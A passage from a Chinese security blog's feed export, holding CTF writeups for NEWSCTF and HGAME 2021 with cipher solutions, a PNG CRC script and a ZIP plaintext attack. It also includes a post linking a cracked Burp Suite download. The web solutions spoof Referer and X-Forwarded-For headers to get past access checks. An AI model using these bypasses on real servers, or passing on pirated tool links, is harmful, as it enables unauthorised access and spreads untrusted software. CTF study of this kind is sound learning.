src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/51151865.png"></p><h2 id="哥哥的秘密"><a href="#哥哥的秘密" class="headerlink" title="哥哥的秘密"></a>哥哥的秘密</h2><blockquote><p>哥哥能有什么秘密呢<br>Hint1:秘密在原图里面<br>Hint:2+3+8num即地区字母+名字字母+生日</p><p>据说哥哥的秘密藏在了妹妹的QQ空间里<br>QQ：2492853776<br>去寻找flag吧</p></blockquote><p>社工题~</p><h1 id="0X2-Web"><a href="#0X2-Web" class="headerlink" title="0X2 Web"></a>0X2 Web</h1><h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><blockquote><p>Web签到题<br>题目地址：<a href="http://47.106.172.29/">http://47.106.172.29</a>:2333/<br>祝福大家找(男/女)朋友能像签到题一样简单</p></blockquote><p>反序列化字符逃逸</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2257254310.png"></p><h1 id="0X3-Crypto"><a href="#0X3-Crypto" class="headerlink" title="0X3 Crypto"></a>0X3 Crypto</h1><h2 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;gM&amp;7AOTKl:236b;HHIm&#x3D;&#39;%8*&#x3D;&#39;&#39;2q;FX]*&lt;,5Z\&gt;&#39;a(\&lt;*)(o:2&lt;mE;DL+19egH[A2@7[A28+B;L2)3;-,Jc&lt;EDpe@kpeS&#x3D;]Ipp@5)e@;FN&lt;1@VeM3&#x3D;tj,I&#x3D;u&#39;8;;FXDT@;BL0@o[bo&#x3D;]\dGA2?f&#39;&lt;CL(F@k&#96;.CASl6l:236V@Vo.c&gt;&amp;6JY@mipjA4Tls;&#x2F;:D4&#x3D;]I2%@PTof&lt;*)gK;eo9(@VeIr</span><br></pre></td></tr></table></figure><p>base85-&gt;base64-&gt;base32</p><h2 id="好日子"><a href="#好日子" class="headerlink" title="好日子"></a>好日子</h2><blockquote><p>好日子，11月11日</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">↗↗←↖↕↖↕↳↗↰↗↺↖→↔↰↕↙↕↺↔↰↖↗↔↖↔↑↔→←↑↖↓↗↓←↔↔↗←↘↕↖←↕↕↻↗↰↕↓↖←↗↲↗↑↗↱↗↘↕↔↕↻←↓↔↘↗↕↕↔↖↑↖↖↗↔↗↲↔↙↗↗↗↗↔↔↕↰↔↔↕↰↖↰↔↔↗→↕↔↗↕↖→↕↖↕↓↖←↗↰↔↑↗↖↕↻←↕↕↕←↖↗↘↔↔↕↔↖→↔↰←↔↖↖↖↘↕↱←↑↔↰↔↗↕↘↕↺←→↗↖↗↲←↙&#x3D;</span><br></pre></td></tr></table></figure><p>百度看看箭头解密可知此为<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=jiantou">文本加密为箭头符号</a>，得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G6fmJNRzinzWvqr1SC4w8f5oJcPLAKHdo3xEdQVDLyGGtjtjZtBdERfcPJqFo5e6HtdRz4VXk1zwhn2FL9</span><br></pre></td></tr></table></figure><p>接着base58得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19oI1ocbbcM5wensOuKarNA3noE&#x2F;HS74RNYqh0stoMpQohkLGqF</span><br></pre></td></tr></table></figure><p>然后<a href="http://www.jsons.cn/rabbitencrypt/">Rabbit解密</a>（我也不知道为啥是它.jpg）得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klv,oclz&#123;mkd_slp_vb_zjjs_slp&#125;</span><br></pre></td></tr></table></figure><p>最后<a href="http://www.atoolbox.net/Tool.php?Id=911">仿射密码</a>（根据题目全设置为11）得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;the_day_is_good_day&#125;</span><br></pre></td></tr></table></figure><h2 id="你懂猪圈？"><a href="#你懂猪圈？" class="headerlink" title="你懂猪圈？"></a>你懂猪圈？</h2><blockquote><p>看看对照表吧</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cipher：1101101011100000110110001110010011110110111100001100100011101000101111101101100011001110110111001011111011011000101111101101001011100000111001001111101</span><br><span class="line"></span><br><span class="line">flag&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line">flag&#x3D;bytes_to_long(flag)</span><br><span class="line">ans&#x3D;flag^(flag&lt;&lt;15)</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line">#ans&#x3D;14569375211114495592988072883061872297563767589932067656113392860528203976417190082740661816716711081417186761262073489271425789667068315834063344130245403597447850801623941898977852694319512368707965</span><br></pre></td></tr></table></figure><p>官方wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;&quotquot;</span><br><span class="line"></span><br><span class="line">def xor(a,b):</span><br><span class="line">    S&#x3D;&quot;&quot;</span><br><span class="line">    for i in range(0,len(a)):</span><br><span class="line">        if a[i]&#x3D;&#x3D;b[i]:</span><br><span class="line">            S+&#x3D;&quot;0&quot;</span><br><span class="line">        else:</span><br><span class="line">            S+&#x3D;&quot;1&quot;</span><br><span class="line">    return S</span><br><span class="line"></span><br><span class="line">flag&#x3D;s[len(s)-15:]</span><br><span class="line">iv&#x3D;flag</span><br><span class="line">N&#x3D;[iv]</span><br><span class="line">for i in range(647,17,-15):</span><br><span class="line">    iv&#x3D;xor(iv,s[i-15:i])</span><br><span class="line">    N.append(iv)</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(len(N)-1,-1,-1):</span><br><span class="line">    flag+&#x3D;N[i]</span><br><span class="line">print(&quot;11&quot;+flag)</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">flag&#x3D;int(&quotquot;,2)</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h2 id="fan-si"><a href="#fan-si" class="headerlink" title="fan si"></a>fan si</h2><blockquote><p>真的是base32，flag{}有用哦<br>Hint1：总共只有两步<br>Hint2：题目就是第一步，fan si？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">72FVZ2II7KL4V2KQVKUXHWYXYW3F7WAONKUF7TYN72XFRED&#x3D;</span><br><span class="line"></span><br><span class="line">真的是base32，但是好像动了什么手脚？</span><br></pre></td></tr></table></figure><p>根据提示可知其为仿射密码</p><h2 id="EZ-RSA"><a href="#EZ-RSA" class="headerlink" title="EZ-RSA"></a>EZ-RSA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import sympy</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z&#x3D;getPrime(1024)</span><br><span class="line">p&#x3D;sympy.nextprime(z)</span><br><span class="line">q&#x3D;sympy.prevprime(10*z)</span><br><span class="line">n&#x3D;p*q</span><br><span class="line"></span><br><span class="line">m&#x3D;bytes_to_long(flag)</span><br><span class="line">e&#x3D;0xe18e</span><br><span class="line">c&#x3D;pow(m,e,n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#n&#x3D;0x2c404d87c6244ad1b44aabd95244d5deb3c93cf3bd798ba4624cd9f89c95e246aad9cbda463292c6ef3140d97c5c1e691c54095e75f56d61a1640decc83caccce52c957282949bed20105d4d67c2b4c3d4c15829657e246d899917022e6d4d07c4382bcc3b83376d7250d85088dc73b24d030f4625fb37c5405cee04ace903d68747035fd55946ad2eb807db0b0508fc24fd54185614ab18c83127b7aa48f9927cc1258f819e02c5d2db4074736e374616664a2b49d1ff3a3effc4af201f235af5193a6e9a0192bb39aad91c5291a1b53973a85bec5dbbb3350e6c344b445c71212938d56a0c99e571bd15356979c394f84398143033fc44eb40558f253bb2445</span><br><span class="line">#c&#x3D;0x73658446624aaccfefa351499ece4c4635f61ff9d9d9354236afbad3b9e4000582b192f92a6e7e96b60a8899610a841faee92cb38d0e195587977cb806ecb7e4ffe8772f34cec9e0957f28040466306fe5db43b96824aa45bbebed9c1dbf15ac13db238234b60b36bded6e137483b307296e76902a13914065004a289b2186777f1c93ca656a19e751d0e7cf8c090803242ccfe14746c43fe6785028cef6380c590d59ed3469f27ac1769fa2f7fe22eace6e9af1ee33f57b120dacddabbd09239bfc133e79945af9a01568aa1e44e79813fa2e9069fb755823c4bee745f6404c1a5b690f5ba5d52c9b783bd0dfc3a4d473e99879241c0453de76be0e72980d39</span><br></pre></td></tr></table></figure><h2 id="EZ-rsa2"><a href="#EZ-rsa2" class="headerlink" title="EZ_rsa2"></a>EZ_rsa2</h2><blockquote><p>so easy<br>Hint1：有限域 n-th root<br>Hint2：别急着转字符，看看数字<br><a href="https://pan.baidu.com/s/1tmaRhaLdR4Zfqdm0yNESCQ">附件</a>（提取码：08oj）</p></blockquote><h2 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h2><blockquote><p>Hint：x=0代进去  四个节点第一个私钥的和就是p，第二个私钥的和就是q<br><a href="https://pan.baidu.com/s/1nFaFSM7GzqdtUq_F1opeKw">附件</a>（提取码：mx47）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NEWSCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp-2021-2破解版下载</title>
      <link href="2021/02/10/burp-2021-2%E7%A0%B4%E8%A7%A3%E7%89%88%E4%B8%8B%E8%BD%BD/"/>
      <url>2021/02/10/burp-2021-2%E7%A0%B4%E8%A7%A3%E7%89%88%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此次版本更新如下内容（此版本改进了消息检查器、非打印字符显示、平台身份验证控件和嵌入式浏览器）</p><h1 id="详情如下"><a href="#详情如下" class="headerlink" title="详情如下"></a>详情如下</h1><h2 id="1-提供了一个新的漏洞定义和几个bug修正"><a href="#1-提供了一个新的漏洞定义和几个bug修正" class="headerlink" title="1.提供了一个新的漏洞定义和几个bug修正"></a>1.提供了一个新的漏洞定义和几个bug修正</h2><blockquote><p>新的漏洞定义：当目标应用程序导入具有已知漏洞的JavaScript依赖项时，易受攻击的JavaScript依赖项ciesburp Scanner现在将检测到，例如，当一个图书馆已经过时或有其他危险时问题。非-打印字符改进在文本编辑器中查看非打印字符时，十六进制代码点低于20的字符将显示为带有十六进制代码的“菱形”。现在，代码点从7F到FF的字符也会显示在同一行中路。每-平台身份验证的主机控件现在可以在每个主机上打开或关闭平台身份验证（在“用户选项”和“连接”选项卡下）基本信息检查器改进消息中的性能有了显著的改进检查员。此外，用户现在可以水平调整消息检查器的大小，并同时选择多个条目一次，嵌入浏览器改进不再发送由嵌入式Chromium浏览器本身而不是用户发起的HTTP请求。</p></blockquote><h2 id="2-Burp的嵌入式浏览器已升级到Chromium-88-0-4324-150。"><a href="#2-Burp的嵌入式浏览器已升级到Chromium-88-0-4324-150。" class="headerlink" title="2.Burp的嵌入式浏览器已升级到Chromium 88.0.4324.150。"></a>2.Burp的嵌入式浏览器已升级到Chromium 88.0.4324.150。</h2><h2 id="3-错误修复和小改进此版本还提供以下错误修复和小改进："><a href="#3-错误修复和小改进此版本还提供以下错误修复和小改进：" class="headerlink" title="3.错误修复和小改进此版本还提供以下错误修复和小改进："></a>3.错误修复和小改进此版本还提供以下错误修复和小改进：</h2><blockquote><p>当在macOS上处于全屏模式时，HTTP历史消息过滤器不再错误地打开新窗口。<br>流响应现在正确地显示在打嗝中继器。<br>打开现有项目文件后，基于Regex的会话验证不再失败。<br>现在激活.burp文件将打开burp并加载该文件，而不是启动burp启动向导。<br>“删除字节”上下文菜单选项已恢复到Burp解码器。<br>消息编辑器现在正确地用双引号突出显示文本。<br>“截获关闭”按钮的颜色现在与附近的按钮匹配。<br>复选框中的标记现在在Burp extensions中正确显示。<br>在Burp入侵者中使用集群炸弹攻击时，取消选择“URL encode these characters”是为了有效负载处理规则和多个有效负载集。<br>Burp套件现在利用了可以发送到Chromium开发工具的最大消息大小，即100MB。这意味着可以加载更大的页面资源。<br>Burp套件的MIME类型分析现在与Chromium的行为匹配。当一个响应中存在多个内容类型头时，Burp选择最后一个。如果有Content-Type头和<meta-http equiv="Content-Type">标记，则Burp选择Content-Type头。此更改会影响“代理”和“目标”选项卡中的MIME类型筛选器，以及“响应查看器”中的“渲染”选项卡。<br>严重性为假阳性的漏洞图标已从蓝色变为绿色。</p></blockquote><h1 id="使用截图"><a href="#使用截图" class="headerlink" title="使用截图"></a>使用截图</h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/54147480.png"></p><p>笔者在测试的时候，发现jdk13 不行，又用了jdk11</p><h1 id="资源分享"><a href="#资源分享" class="headerlink" title="资源分享"></a>资源分享</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接：https:<span class="comment">//pan.baidu.com/s/1xzIuCkm9E9uiKNJJGwYZcQ提取码：wfoo 复制这段内容后打开百度网盘手机App，操作更方便哦--来自百度网盘超级会员V3的分享</span></span><br></pre></td></tr></table></figure><p>值得注意的是，我把jdk11的安装包也放进去了，是不是很贴心？</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021 WEEK1</title>
      <link href="2021/02/07/2021HGAMEWEEK1/"/>
      <url>2021/02/07/2021HGAMEWEEK1/</url>
      
        <content type="html"><![CDATA[<h1 id="0X1Misc"><a href="#0X1Misc" class="headerlink" title="0X1Misc"></a>0X1Misc</h1><h2 id="1-Base全家福"><a href="#1-Base全家福" class="headerlink" title="1.Base全家福"></a>1.Base全家福</h2><blockquote><p>新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</p></blockquote><p>base64-&gt;base32-&gt;base16</p><h2 id="2-不起眼压缩包的养成的方法"><a href="#2-不起眼压缩包的养成的方法" class="headerlink" title="2.不起眼压缩包的养成的方法"></a>2.不起眼压缩包的养成的方法</h2><blockquote><p>0x4qE给了张图给我，说这图暗藏玄机，你能帮我找出来吗？</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3802484613.png"></p></blockquote><p>很明显是个压缩包，打开发现加密了~提示如下</p><blockquote><p>锘縋assword is picture ID (Up to 8 digits)</p></blockquote><p>猜测密码为其P站ID，识图得到其ID：70415155，成功解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;graph.baidu.com&#x2F;s?sign&#x3D;12672a6df695e369823b901612610051&amp;f&#x3D;all&amp;tn&#x3D;pc&amp;tn&#x3D;pc&amp;srcp&#x3D;&amp;idctag&#x3D;gz&amp;sids&#x3D;10006_10802_10902_10913_11004_10924_10903_10018_10901_10942_10907_11013_10971_10966_10974_11032_12201_16201_17114_17850_17070_18013_18102_19002_19107_18240&amp;logid&#x3D;851833886&amp;pageFrom&#x3D;graph_upload_pcshitu&amp;extUiData%5BisLogoShow%5D&#x3D;1&amp;tpl_from&#x3D;pc&amp;entrance&#x3D;general</span><br></pre></td></tr></table></figure><p>文本提示如下</p><blockquote><p>Sometimes we don’t need to care about password.<br>Because it’s too strong or null. XD<br>By the way, I only use storage.</p></blockquote><p>plain-&gt;明文攻击得到密码：C8uvP$DP</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/731862508.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2319541266.png"></p><p>接着又是一层加密：伪加密，09-&gt;00，成功解压，将flag.txt放入010得到</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3523275955.png"></p><p>最后html解码得到flag<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3322543382.png"></p><h2 id="3-Galaxy"><a href="#3-Galaxy" class="headerlink" title="3.Galaxy"></a>3.Galaxy</h2><blockquote><p>Akira的信物：用于提升Akira的潜能。一张藏着秘密的星空壁纸，不幸的是似乎在某次行动中遗失了。</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/2/galaxy_a123bd9c2edcc8439575cacdf2afe352.pcapng"><strong>附件</strong></a></p></blockquote><p>http下发现png，将其导出</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1850788702.png"></p><p>接着010打开发现模板会报CRC mismatch，其原因就是图片高度不正确导致trunk0CRC校验失效</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2315278038.png"></p><p>于是乎跑脚本修改高度得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/987405351.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2202810146.png"></p><p>附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0xEB1EA007</span>):</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure><h2 id="4-Word-RE-MASTER"><a href="#4-Word-RE-MASTER" class="headerlink" title="4.Word RE:MASTER"></a>4.Word RE:MASTER</h2><blockquote><p>timmix不知所踪，只留下了两个word文档，作为word专家的你能帮忙找出他的去向吗？</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/2/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip"><strong>附件</strong></a></p></blockquote><p>很明显需要通过first.docx得到密码打开maimai.docx，于是将其变成压缩包查看发现在<code>first.zip\word\password.xml</code>目录下找到密码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3036120003.png"></p><p>根据原文提示得知应该是brainfuck解码得到最终密码DOYOUKNOWHIDDEN?</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2123557118.png"></p><p>接着根据图片提示应该是<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html"><strong>snow隐写：在线工具</strong></a></p><p>创建一个snow.html的文件并将信息复制粘贴进去</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3333437075.png"></p><p>放入服务器生成对应链接</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2141825541.png"></p><p>最后解密得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1961670057.png"></p><h1 id="0X2Web"><a href="#0X2Web" class="headerlink" title="0X2Web"></a>0X2Web</h1><h2 id="1-Hitchhiking-in-the-Galaxy"><a href="#1-Hitchhiking-in-the-Galaxy" class="headerlink" title="1.Hitchhiking_in_the_Galaxy"></a>1.Hitchhiking_in_the_Galaxy</h2><blockquote><p>第一次在银河系里搭顺风车，要准备啥，在线等，挺急的<br>Challenge Address<br><a href="http://hitchhiker42.0727.site/">http://hitchhiker42.0727.site</a>:42420</p></blockquote><p>F12查看源码发现<code>HitchhikerGuide.php</code>并且访问会跳转至<code>index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3459158084.png"></p><p>于是burp进行抓包，并且得抓到<code>HitchhikerGuide.php</code>的包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1296440783.png"></p><p>查看响应并修改请求头（GET-&gt;POST）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3444721393.png"></p><p>发现需要伪造引擎（User-Agent处后面加上Infinite Improbability Drive）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/243769077.png"></p><p>又发现需要通过<code>https://cardinal.ink/</code>访问（Referer:<a href="https://cardinal.ink/%EF%BC%89">https://cardinal.ink/）</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/493505758.png"></p><p>伪造IP得到flag（X-Forwarded-For: 127.0.0.1）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2781204128.png"></p><h2 id="2-watermelon"><a href="#2-watermelon" class="headerlink" title="2.watermelon"></a>2.watermelon</h2><blockquote><p>简单且上头的游戏<br>Challenge Address<br><a href="http://watermelon.ryen.xyz/">http://watermelon.ryen.xyz</a>:800/</p></blockquote><p>cocos 游戏的原理，其核心就是xxx/src/project.js</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4164126969.png"></p><p>最后base64解一下就得到flag：hgame{do_you_know_cocos_game?}</p><blockquote><p>也可以通过控制台修改红线高度~这样就能轻易达到两千分得到flag</p></blockquote><h2 id="3-宝藏走私者"><a href="#3-宝藏走私者" class="headerlink" title="3.宝藏走私者"></a>3.宝藏走私者</h2><blockquote><p>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。 为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。 调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。 这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？<br>Challenge Address<br><a href="http://thief.0727.site/">http://thief.0727.site</a>:80</p></blockquote><p>请求走私</p><h2 id="4-智商检测鸡"><a href="#4-智商检测鸡" class="headerlink" title="4.智商检测鸡"></a>4.智商检测鸡</h2><blockquote><p>又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目）<br>Challenge Address<br><a href="http://r4u.top/">http://r4u.top</a>:5000/</p></blockquote><p>做完一百道即可得到flag附上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from sympy import *</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;r4u.top:5000&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(101):</span><br><span class="line">    try:</span><br><span class="line">        questionRaw &#x3D; session.get(url + &quot;api&#x2F;getQuestion&quot;).content</span><br><span class="line">        print(&quot;[+] Parsing &#123;&#125;&quot;.format(questionRaw))</span><br><span class="line">        regex &#x3D; r&quot;([-+]&#123;1&#125;)&lt;&#x2F;mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;&#x2F;mn&gt;&lt;&#x2F;mrow&gt;&lt;mrow&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span><br><span class="line">        matches &#x3D; re.findall(regex, questionRaw.decode(&quot;UTF-8&quot;))</span><br><span class="line">        lowerLimit, upperLimit &#x3D; (int(matches[0][0] + matches[0][1]), int(matches[0][2]))</span><br><span class="line">        print(&quot;[+] Matching &#123;&#125; from &#123;&#125; to &#123;&#125;&quot;.format(matches, lowerLimit, upperLimit))</span><br><span class="line"></span><br><span class="line">        regex &#x3D; r&quot;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;&#x2F;mn&gt;&lt;mi&gt;x&lt;&#x2F;mi&gt;&lt;mo&gt;([+-]&#123;1&#125;)&lt;&#x2F;mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span><br><span class="line">        matches &#x3D; re.findall(regex, questionRaw.decode(&quot;UTF-8&quot;))</span><br><span class="line">        arg1, operator, arg2 &#x3D; matches[0]</span><br><span class="line">        print(&quot;[+] Calculate &#123;&#125; with &#123;&#125; &#123;&#125; &#123;&#125;&quot;.format(matches, arg1, operator, arg2))</span><br><span class="line">        x &#x3D; symbols(&#39;x&#39;)</span><br><span class="line">        result &#x3D; &quot;%.2f&quot; % (integrate(int(arg1) * x + int(arg2), (x, lowerLimit, upperLimit)))</span><br><span class="line">        print(&quot;[+] Calculated result is &#123;&#125;&quot;.format(result))</span><br><span class="line"></span><br><span class="line">        response &#x3D; session.post(url + &quot;api&#x2F;verify&quot;, data&#x3D;json.dumps(&#123;&quot;answer&quot;: result&#125;), headers&#x3D;&#123;&#39;Content-Type&#39;: &#39;application&#x2F;json&#39;&#125;)</span><br><span class="line">        print(&quot;[*] Verify status is &#123;&#125;&quot;.format(response.content))</span><br><span class="line">        if b&quot;true&quot; in response.content:</span><br><span class="line">            print(&quot;[+] Verify correct with &#123;&#125;&quot;.format(result))</span><br><span class="line">            print(&quot;[*] Raw data is &#123;&#125;&quot;.format(response.content))</span><br><span class="line">        response.close()</span><br><span class="line">        status &#x3D; session.get(url + &quot;api&#x2F;getStatus&quot;).content</span><br><span class="line">        print(&quot;[*] Status is &#123;&#125;&quot;.format(status))</span><br><span class="line">        index &#x3D; session.get(url).content</span><br><span class="line">        print(&quot;[*] Index is &#123;&#125;&quot;.format(index))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">print(&quot;[+] Done All for you and cookie is &#123;&#125;&quot;.format(session.cookies))</span><br></pre></td></tr></table></figure><p>先删除原先的cookie，然后将网页的cookie替换成跑出来的cookie</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4213677248.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3197138214.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 